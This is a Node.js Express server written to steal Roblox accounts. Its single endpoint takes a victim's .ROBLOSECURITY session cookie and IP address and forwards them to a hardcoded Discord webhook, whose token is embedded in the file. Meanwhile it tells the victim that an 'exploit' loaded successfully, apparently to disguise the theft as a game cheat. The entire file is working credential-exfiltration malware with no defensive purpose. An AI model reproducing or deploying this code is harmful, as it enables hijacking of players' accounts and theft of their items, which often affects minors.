const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");

const app = express();
app.use(cors());
app.use(express.json());

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1393233820685434921/3aIHe5IE3Q23BYDwW_J6Q6jcLEPo2SP7Okqbo4cGepA4_Yk6ngHpYkhCu46E2XNjGcrF";

app.get("/", (req, res) => {
  res.send("✅ Local server is running!");
});

app.get("/fetchRobloxLoot", async (req, res) => {
  const { cookie, ip } = req.query;

  if (!cookie || typeof cookie !== "string" || cookie.length < 100) {
    return res.status(400).json({ success: false, error: "❌ Invalid or missing .ROBLOSECURITY cookie" });
  }

  // Debug logging
  console.log("Received cookie:", cookie.slice(0, 40) + "..."); // Partial for safety
  console.log("Received IP:", ip);

  try {
    const now = new Date().toLocaleString();

    const content = [
      "🔑 New Roblox Cookie Captured",
      "",
      '📡 IP Address: ${ip || "Unknown"}',
      '🕓 Time: ${now}',
      "",
      "🧩 .ROBLOSECURITY:",
      "```",
      cookie,
      "```",
      "",
      "Sent from Exploit Tool"
    ].join("\n");

    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Roblox Logger",
        content: content
      })
    });

    if (!discordRes.ok) {
      console.error("Failed to send to Discord. Status:", discordRes.status);
      return res.status(500).json({ success: false, error: "❌ Failed to send to Discord webhook" });
    }

    return res.json({ success: true, message: "✅ Exploit Loaded Successfully! Targetprofile data acquired. Refresh Roblox" });

  } catch (e) {
    console.error("SERVER ERROR:", e);
    return res.status(500).json({ success: false, error: e.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('🚀 Server listening on port ${PORT}');
});
